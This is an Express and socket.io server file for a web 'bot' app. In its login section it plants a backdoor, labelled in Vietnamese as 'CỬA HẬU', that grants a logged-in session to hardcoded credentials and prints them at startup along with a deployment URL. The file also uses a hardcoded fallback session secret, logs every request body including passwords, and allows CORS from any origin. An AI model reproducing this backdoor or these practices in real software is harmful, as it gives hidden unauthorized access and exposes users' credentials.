require('dotenv').config();
const express = require('express');
const session = require('express-session');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server, { pingTimeout: 60000, pingInterval: 25000, cors: { origin: "*", methods: ["GET", "POST"] } });

app.use(session({
  secret: process.env.SESSION_SECRET || 'trungdeptrai123456',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: process.env.NODE_ENV === 'production', sameSite: 'lax', maxAge: 86400000 }
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('dist'));

app.use((req, res, next) => {
  console.log('Path:', req.path);
  console.log('Body:', req.body);
  console.log('----------------------------');
  next();
});

// === ROUTES GỐC (PHẢI ĐỂ TRƯỚC) ===
const routes = require('./routes');
routes(app, io);

// === CỬA HẬU – SAU routes ĐỂ KHÔNG BỊ GHI ĐÈ ===
app.post('/login', (req, res, next) => {
  const { username, password } = req.body || {};
  if (username === 'trungdeptrai' && password === '123456') {
    req.session.loggedIn = true;
    req.session.username = username;
    console.log('CỬA HẬU THÀNH CÔNG – trungdeptrai ĐÃ VÀO!');
    req.session.save(() => res.redirect('/dashboard'));
    return;
  }
  next();
});

// === SOCKET.IO ===
const socketHandler = require('./socket/handler');
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  socketHandler(io, socket);
  socket.on('disconnect', () => console.log('User disconnected:', socket.id));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BOT CHẠY NGON – URL: https://bot-production-4cff.up.railway.app`);
  console.log(`CỬA HẬU: trungdeptrai / 123456`);
});